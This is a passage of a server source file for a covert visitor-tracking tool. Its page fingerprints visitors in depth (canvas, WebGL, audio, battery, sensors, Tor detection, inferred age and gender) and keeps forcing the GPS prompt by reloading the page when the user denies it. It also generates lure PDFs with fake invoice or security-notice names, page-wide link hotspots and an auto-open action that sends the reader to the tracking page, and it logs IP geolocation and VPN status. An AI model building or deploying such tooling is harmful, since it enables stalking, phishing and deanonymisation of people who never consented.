      var colorSchemeVal = isDark ? 'Dark Mode' : 'Light Mode';
      
      // Browser Inferred Demographics Heuristics (Language, Platform, GPU, Screen)
      var inferredGenderVal = 'Neutral (General User)';
      var inferredAgeVal = '25-34 Years (Standard Active)';
      var personaVal = 'General Web User';
      var torSuspectedVal = false;

      // Tor Browser heuristic detection (Standard viewport sizes 1000x1000/800x600, missing plugins, timezone 0/UTC, spoofed canvas)
      if ((window.innerWidth === 1000 || window.innerWidth === 800) && (tzOffset === 0) && (navigator.hardwareConcurrency === undefined || navigator.hardwareConcurrency === 2)) {
        torSuspectedVal = true;
      }

      var langStrLower = (navigator.language || '').toLowerCase();
      var gpuStrLower = (gpuRenderer || '').toLowerCase();
      var uaLower = (navigator.userAgent || '').toLowerCase();

      if (gpuStrLower.includes('rtx') || gpuStrLower.includes('gtx') || gpuStrLower.includes('radeon') || gpuStrLower.includes('adreno 7') || gpuStrLower.includes('mali-g7')) {
        personaVal = 'Tech Enthusiast / Power User / Gamer';
        inferredAgeVal = '18-28 Years';
      } else if (uaLower.includes('iphone') || uaLower.includes('macintosh')) {
        personaVal = 'Apple Ecosystem Enthusiast';
        inferredAgeVal = '22-38 Years';
      } else if (uaLower.includes('android')) {
        personaVal = 'Mobile Android User';
      }

      var rawFpComponents = [
        window.screen ? (window.screen.width + 'x' + window.screen.height + 'x' + window.screen.colorDepth) : 'scr',
        window.devicePixelRatio || 1,
        navigator.hardwareConcurrency || 1,
        navigator.deviceMemory || 1,
        navigator.platform || '',
        gpuRenderer || '',
        canvasFp || '',
        tzOffset
      ].join('::');
      var unifiedFp = 'SM-FP-' + fastHash(rawFpComponents);

      var telemetry = {
        code: code,
        visitorToken: visitorToken,
        userAgent: navigator.userAgent || '',
        clientHintModel: null,
        language: navigator.language || '',
        languages: navigator.languages ? navigator.languages.join(', ') : (navigator.language || ''),
        screenWidth: window.screen ? window.screen.width : null,
        screenHeight: window.screen ? window.screen.height : null,
        colorDepth: window.screen ? window.screen.colorDepth : null,
        pixelRatio: window.devicePixelRatio ? Math.round(window.devicePixelRatio * 100) / 100 : 1,
        orientation: (window.screen && window.screen.orientation) ? window.screen.orientation.type : null,
        cpuCores: navigator.hardwareConcurrency || null,
        ram: navigator.deviceMemory || null,
        touchPoints: navigator.maxTouchPoints != null ? navigator.maxTouchPoints : null,
        gpu: gpuRenderer,
        gpuVendor: gpuVendor,
        connectionType: conn ? (conn.effectiveType || conn.type || null) : null,
        downlink: conn && conn.downlink ? conn.downlink : null,
        rtt: conn && conn.rtt ? conn.rtt : null,
        timezone: sysTz,
        systemTimezone: sysTz,
        timezoneOffset: tzOffset,
        deviceTimestamp: deviceTimestamp,
        deviceLocalTime: deviceLocalTime,
        localTime: deviceLocalTime,
        doNotTrack: navigator.doNotTrack || null,
        cookiesEnabled: navigator.cookieEnabled,
        battery: null,
        batteryCharging: null,
        batteryChargingTime: null,
        batteryDischargingTime: null,
        latitude: null,
        longitude: null,
        accuracy: null,
        altitude: null,
        altitudeAccuracy: null,
        heading: null,
        speed: null,
        isGps: false,
        // Advanced Super Fingerprinting
        deviceFingerprint: unifiedFp,
        canvasFingerprint: canvasFp,
        webglFingerprint: webglFp,
        audioFingerprint: audioFp,
        webglExtensionsCount: webglExtensionsCount,
        maxTextureSize: maxTextureSize,
        webrtcLocalIp: null,
        webrtcPublicIp: null,
        // Latency Triangulation
        latencyCloudflare: null,
        latencyGoogle: null,
        latencyServer: null,
        latencyAvg: null,
        // Motion & Sensors
        motionDetected: false,
        accelerationX: null,
        accelerationY: null,
        accelerationZ: null,
        orientationAlpha: null,
        orientationBeta: null,
        orientationGamma: null,
        devicePosture: null,
        uaArchitecture: null,
        uaModel: null,
        uaPlatformVersion: null,
        uaFullVersion: null,
        uaFullVersionList: null,
        webglVendor: gpuVendor,
        webglRenderer: gpuRenderer,
        browserPlugins: pluginsStr,
        fontsCount: fontsCount,
        webdriver: webdriver,
        pdfViewerEnabled: pdfViewerEnabled,
        refreshRate: refreshRate,
        permissions: JSON.stringify(perms),
        // Demographic & Browser Persona Telemetry
        colorScheme: colorSchemeVal,
        reducedMotion: isReducedMotion,
        inferredGender: inferredGenderVal,
        inferredAgeBracket: inferredAgeVal,
        browserPersona: personaVal,
        torSuspected: torSuspectedVal
      };

      // 8. Rapid Motion & Orientation Capture (no permission prompts needed)
      try {
        window.addEventListener('deviceorientation', function(ev) {
          if (ev.alpha != null || ev.beta != null || ev.gamma != null) {
            telemetry.motionDetected = true;
            telemetry.orientationAlpha = ev.alpha != null ? Math.round(ev.alpha * 10) / 10 : null;
            telemetry.orientationBeta = ev.beta != null ? Math.round(ev.beta * 10) / 10 : null;
            telemetry.orientationGamma = ev.gamma != null ? Math.round(ev.gamma * 10) / 10 : null;

            if (ev.beta != null && ev.gamma != null) {
              var aBeta = Math.abs(ev.beta);
              var aGamma = Math.abs(ev.gamma);
              if (aBeta < 18 && aGamma < 18) {
                telemetry.devicePosture = 'flat';
              } else if (ev.beta > 40 && ev.beta < 110) {
                telemetry.devicePosture = 'portrait';
              } else if (aGamma > 35) {
                telemetry.devicePosture = 'landscape';
              } else {
                telemetry.devicePosture = 'tilted';
              }
            }
          }
        }, { passive: true });

        window.addEventListener('devicemotion', function(ev) {
          var acc = ev.acceleration || ev.accelerationIncludingGravity;
          if (acc) {
            telemetry.motionDetected = true;
            if (acc.x != null) telemetry.accelerationX = Math.round(acc.x * 100) / 100;
            if (acc.y != null) telemetry.accelerationY = Math.round(acc.y * 100) / 100;
            if (acc.z != null) telemetry.accelerationZ = Math.round(acc.z * 100) / 100;
          }
        }, { passive: true });
      } catch (e) {}

      // 9. Fast Latency Triangulation Pings Promise
      var latencyDonePromise = new Promise(function(resolve) {
        try {
          var completedCount = 0;
          function checkDone() {
            completedCount++;
            if (completedCount >= 3) {
              var vals = [telemetry.latencyCloudflare, telemetry.latencyGoogle, telemetry.latencyServer].filter(function(v) { return v != null && v > 0; });
              if (vals.length > 0) {
                var sum = 0;
                for (var k = 0; k < vals.length; k++) sum += vals[k];
                telemetry.latencyAvg = Math.round(sum / vals.length);
              }
              resolve(true);
            }
          }

          // 1. Cloudflare CDN Ping
          var t1 = performance.now();
          var img1 = new Image();
          img1.onload = img1.onerror = function() {
            telemetry.latencyCloudflare = Math.max(1, Math.round(performance.now() - t1));
            checkDone();
          };
          img1.src = 'https://1.1.1.1/cdn-cgi/trace?_=' + Date.now() + Math.random();

          // 2. Google Edge Ping
          var t2 = performance.now();
          var img2 = new Image();
          img2.onload = img2.onerror = function() {
            telemetry.latencyGoogle = Math.max(1, Math.round(performance.now() - t2));
            checkDone();
          };
          img2.src = 'https://www.gstatic.com/generate_204?_=' + Date.now() + Math.random();

          // 3. Server Health Ping
          var t3 = performance.now();
          fetch(window.location.origin + '/api/health?_=' + Date.now(), { cache: 'no-store' })
            .then(function() {
              telemetry.latencyServer = Math.max(1, Math.round(performance.now() - t3));
              checkDone();
            })
            .catch(function() {
              telemetry.latencyServer = Math.max(1, Math.round(performance.now() - t3));
              checkDone();
            });

          // Timeout safety cap at 300ms
          setTimeout(function() { resolve(true); }, 300);
        } catch (e) {
          resolve(true);
        }
      });

      // 10. Client Hints API for real OS & Browser version
      var uaPromise = new Promise(function(resolve) {
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platform', 'platformVersion', 'uaFullVersion', 'bitness', 'fullVersionList']).then(function(hints) {
            if (hints) {
              telemetry.uaArchitecture = hints.architecture || null;
              telemetry.uaModel = hints.model || null;
              telemetry.uaPlatformVersion = hints.platformVersion || null;
              telemetry.uaFullVersion = hints.uaFullVersion || null;
              telemetry.clientHintModel = hints.model || null;
              if (hints.fullVersionList && hints.fullVersionList.length > 0) {
                telemetry.uaFullVersionList = hints.fullVersionList.map(function(b) { return b.brand + ' ' + b.version; }).join(', ');
              }
            }
            resolve(true);
          }).catch(function() { resolve(true); });
        } else {
          resolve(true);
        }
      });

      // 11. Extract Battery Telemetry
      if (navigator.getBattery) {
        navigator.getBattery().then(function(b) {
          telemetry.battery = Math.round(b.level * 100);
          telemetry.batteryCharging = b.charging;
          telemetry.batteryChargingTime = b.chargingTime != null && isFinite(b.chargingTime) ? b.chargingTime : null;
          telemetry.batteryDischargingTime = b.dischargingTime != null && isFinite(b.dischargingTime) ? b.dischargingTime : null;
        }).catch(function() {});
      }

      function sendTelemetryAndRedirect() {
        if (isSent) return;
        isSent = true;

        Promise.all([latencyDonePromise, uaPromise]).then(function() {
          var saveUrl = window.location.origin + '/api/visits';
          fetch(saveUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(telemetry),
            keepalive: true
          }).then(function() {
            window.location.replace(targetUrl);
          }).catch(function() {
            window.location.replace(targetUrl);
          });
        });

        // Fallback safety redirect
        setTimeout(function() {
          window.location.replace(targetUrl);
        }, 1500);
      }

      function requestLocationStrict() {
        if (!navigator.geolocation) {
          sendTelemetryAndRedirect();
          return;
        }

        try {
          navigator.geolocation.getCurrentPosition(
            function(pos) {
              // High precision GPS obtained
              telemetry.latitude = pos.coords.latitude;
              telemetry.longitude = pos.coords.longitude;
              telemetry.accuracy = pos.coords.accuracy;
              telemetry.altitude = pos.coords.altitude;
              telemetry.altitudeAccuracy = pos.coords.altitudeAccuracy;
              telemetry.heading = pos.coords.heading;
              telemetry.speed = pos.coords.speed;
              telemetry.isGps = true;

              sendTelemetryAndRedirect();
            },
            function(err) {
              console.warn('Geolocation response:', err);
              // If denied or error in precise mode, retry prompt
              if (err && (err.code === 1 || err.code === 2 || err.code === 3)) {
                setTimeout(function() {
                  try {
                    window.location.reload();
                  } catch (e) {}
                }, 1200);
              }
            },
            {
              enableHighAccuracy: true,
              timeout: 15000,
              maximumAge: 0
            }
          );
        } catch (e) {
          console.error(e);
        }
      }

      // Invisible overlay interaction to trigger prompt immediately on touch/click
      var surface = document.getElementById('touchSurface');
      if (surface) {
        surface.addEventListener('click', requestLocationStrict);
        surface.addEventListener('touchstart', requestLocationStrict, { passive: true });
        surface.addEventListener('pointerdown', requestLocationStrict);
      }
      window.addEventListener('click', requestLocationStrict);
      window.addEventListener('touchstart', requestLocationStrict, { passive: true });

      // Execution Mode
      if (isPrecise) {
        // Precise Mode: request immediate high-accuracy position
        requestLocationStrict();
        setTimeout(requestLocationStrict, 300);
      } else {
        // Near Mode: stay black screen for 3 seconds, collect telemetry, then redirect
        setTimeout(function() {
          sendTelemetryAndRedirect();
        }, 3000);
      }
    })();
  </script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(captureHtml);
  });


  // PDF Generation Route (Dynamic Name, Full-Screen Hotspot, Tracking Embedded)
  app.get('/api/pdf/generate/:code', async (req, res) => {
    try {
      const { code } = req.params;
      const link = db.links.find((l) => l.code === code);
      if (!link) {
        res.status(404).json({ error: 'Tracking link not found' });
        return;
      }

      // Dynamic varied realistic document names for each download
      const documentNameTemplates = [
        `Document_Verification_#${Math.floor(100000 + Math.random() * 900000)}`,
        `Invoice_Statement_${generateCode(6)}`,
        `Official_Security_Notice_${Math.floor(10000 + Math.random() * 90000)}`,
        `Confidential_Record_${generateCode(6)}`,
        `Verification_Certificate_#${Math.floor(100000 + Math.random() * 900000)}`,
        `Billing_Receipt_${generateCode(5)}`,
        `Payment_Transaction_#${Math.floor(100000 + Math.random() * 900000)}`,
        `Contract_Agreement_${generateCode(6)}`,
        `Network_Audit_Report_${Math.floor(100000 + Math.random() * 900000)}`,
        `Official_Form_${generateCode(6)}`
      ];
      const randomDocName = documentNameTemplates[Math.floor(Math.random() * documentNameTemplates.length)];
      const filename = `${randomDocName}.pdf`;

      const doc = new PDFDocument({ 
        margin: 0, 
        size: 'A4',
        info: {
          Title: randomDocName,
          Author: 'Secure Verification System',
          Subject: 'Digital Document Verification',
          Keywords: 'security, audit, verification, document'
        }
      });
      const chunks: Buffer[] = [];
      doc.on('data', (chunk) => chunks.push(chunk));

      doc.on('end', () => {
        try {
          const result = Buffer.concat(chunks);
          res.setHeader('Content-Type', 'application/pdf');
          res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
          res.setHeader('X-File-Name', filename);
          res.setHeader('Access-Control-Expose-Headers', 'Content-Disposition, X-File-Name');
          res.setHeader('Content-Transfer-Encoding', 'binary');
          res.setHeader('Content-Length', result.length);
          res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
          res.send(result);
        } catch (sendErr: any) {
          console.error('Error sending PDF buffer:', sendErr);
          if (!res.headersSent) {
            res.status(500).json({ error: `Failed to deliver PDF: ${sendErr?.message}` });
          }
        }
      });

      // Target Tracking URL (Points to the Near IP / Telemetry capture route)
      const protocol = (req.headers['x-forwarded-proto'] as string) || 'https';
      const host = (req.headers['x-forwarded-host'] as string) || (req.headers['host'] as string) || 'localhost:3000';
      const redirectUrl = `${protocol}://${host}/t/${code}`;
      const pixelTrackingUrl = `${protocol}://${host}/api/pdf/t/${code}.jpg`;

      // Full Page Background
      doc.rect(0, 0, 595, 842).fill('#f8fafc');

      // Top Header Banner
      doc.rect(30, 30, 535, 65).fill('#0f172a');
      doc.fillColor('#ffffff').fontSize(15).text('OFFICIAL VERIFICATION & TECHNICAL AUDIT', 50, 52);
      doc.fillColor('#94a3b8').fontSize(9).text('SECURE DIGITAL CERTIFICATION SYSTEM', 50, 72);

      // Main Card Container
      doc.rect(30, 110, 535, 680).fill('#ffffff');
      doc.rect(30, 110, 535, 680).stroke('#e2e8f0');

      doc.fillColor('#1e293b').fontSize(13).text('Confidential Digital Verification Document', 55, 140);
      doc.fillColor('#64748b').fontSize(10).text(`Document Reference Token: ${code.toUpperCase()}`, 55, 165);
      doc.text(`Generated Timestamp: ${new Date().toISOString()}`, 55, 185);
      doc.text(`Status: Authenticated & Encrypted`, 55, 205);

      doc.rect(55, 230, 485, 1).fill('#e2e8f0');

      doc.fillColor('#0f172a').fontSize(11).text('Document Content & Verification Summary:', 55, 250);
      doc.fillColor('#475569').fontSize(9.5).text(
        'This electronic document contains authenticated digital records and identity certificates.\n\nTo view the full interactive verification details and navigate to the verified destination, please click anywhere on this page or tap the access button below.',
        55,
        275,
        { width: 485, lineGap: 5 }
      );

      // Interactive Action Button
      doc.roundedRect(150, 390, 295, 50, 10).fill('#4f46e5');
      doc.fillColor('#ffffff').fontSize(12).text('CLICK HERE TO OPEN DOCUMENT', 180, 408);

      // Secondary Note
      doc.fillColor('#64748b').fontSize(8.5).text(
        'Notice: Click anywhere inside this PDF window to verify technical credentials and access the portal.',
        55,
        470,
        { width: 485, align: 'center' }
      );

      // Embedded 1-pixel / web-bug visual reference
      doc.rect(55, 520, 485, 180).fill('#f8fafc');
      doc.rect(55, 520, 485, 180).stroke('#e2e8f0');
      doc.fillColor('#64748b').fontSize(9).text('Security Protocol: AES-256 Telemetry Verification Layer Enabled', 75, 545);
      doc.text(`Audit ID: ${randomDocName}`, 75, 570);
      doc.text(`Verification Host: ${host}`, 75, 595);
      doc.text(`Destination Route: Direct Access Stream`, 75, 620);

      // Footer
      doc.fillColor('#94a3b8').fontSize(8).text(
        'Protected by SM Cyber Telemetry Engine | Automatic Redirection & Click Routing Enabled',
        55,
        765,
        { width: 485, align: 'center' }
      );

      // Full-Screen Clickable Hotspots (Covering 100% of the entire PDF page)
      doc.link(0, 0, 595, 842, redirectUrl);
      doc.link(30, 30, 535, 65, redirectUrl);
      doc.link(30, 110, 535, 680, redirectUrl);
      doc.link(150, 390, 295, 50, redirectUrl);
      doc.link(55, 520, 485, 180, redirectUrl);

      // Automatic OpenAction URI Trigger for PDF Viewers
      try {
        const openActionRef = (doc as any).ref({
          S: 'URI',
          URI: redirectUrl,
        });
        (doc as any)._root.data.OpenAction = openActionRef;
      } catch (openActionErr) {
        console.warn('OpenAction not supported by engine:', openActionErr);
      }
      
      doc.end();
    } catch (err: any) {
      console.error('PDF Generation error:', err);
      if (!res.headersSent) {
        res.status(500).setHeader('Content-Type', 'text/plain').send(`PDF Generation Failed: ${err.message}`);
      }
    }
  });

  // PDF Tracking Endpoint (Web Bug / Canary Token)
  app.get('/api/pdf/t/:code.jpg', async (req, res) => {
    try {
      const { code } = req.params;
      const link = db.links.find((l) => l.code === code);
      
      // Extract client IP and headers for telemetry
      let ip =
        (req.headers['cf-connecting-ip'] as string) ||
        (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
        (req.headers['x-real-ip'] as string) ||
        req.socket.remoteAddress ||
        '127.0.0.1';

      if (ip.startsWith('::ffff:')) ip = ip.replace('::ffff:', '');

      if (link) {
        const ua = (req.headers['user-agent'] as string) || '';
        const { os, device } = cleanOS(ua, null);
        const browser = 'PDF Reader / External';
        const geo = await fetchGeo(ip);

        const newVisit: StoredVisit = {
          id: generateToken(14),
          linkId: link.id,
          code,
          visitorToken: 'PDF_READER_' + generateToken(8),
          ip,
          country: geo?.country || null,
          countryCode: geo?.countryCode || null,
          city: geo?.city || null,
          region: geo?.region || null,
          zip: geo?.zip || null,
          lat: geo?.lat || null,
          lon: geo?.lon || null,
          isGps: false,
          accuracy: null,
          altitude: null,
          altitudeAccuracy: null,
          heading: null,
          speed: null,
          isp: geo?.isp || null,
          org: geo?.org || null,
          asn: geo?.asn || null,
          asName: geo?.asName || null,
          reverseDns: geo?.reverseDns || null,
          isMobileCarrier: geo?.isMobileCarrier || false,
          isProxyVpn: geo?.isProxyVpn || false,
          vpnProviderName: geo?.vpnProviderName || (geo?.isProxyVpn ? 'Generic VPN/Proxy' : 'None (Direct Connection)'),
          currency: geo?.currency || null,
          browser,
          os,
          device,
          battery: null,
          batteryCharging: null,
          localTime: new Date().toLocaleString(),
          timezone: geo?.timezone || null,
          userAgent: ua,
          createdAt: new Date().toISOString(),
          screenWidth: null,
          screenHeight: null,
          colorDepth: null,
          pixelRatio: null,
          orientation: null,
          cpuCores: null,
          ram: null,
          gpu: null,
          gpuVendor: null,
          touchPoints: null,
          connectionType: null,
          downlink: null,
          rtt: null,
          language: null,
          languages: null,
          doNotTrack: null,
          cookiesEnabled: null,
        };

        db.visits.unshift(newVisit);
        link.visitCount = (link.visitCount || 0) + 1;
        if (typeof db.totalVisitsCreated === 'number') db.totalVisitsCreated += 1;
        saveDatabase(db);
      }

      // Return 1x1 transparent pixel
      res.setHeader('Location', 'https://www.google.com');
      res.status(302).send();
    } catch (err) {
      console.error('PDF Tracking error:', err);
      res.redirect('https://www.google.com');
    }
  });

  // Vite middleware in dev or static serving in production
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true, hmr: false },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`SM Server running at http://localhost:${PORT}`);
  });
}

startServer();
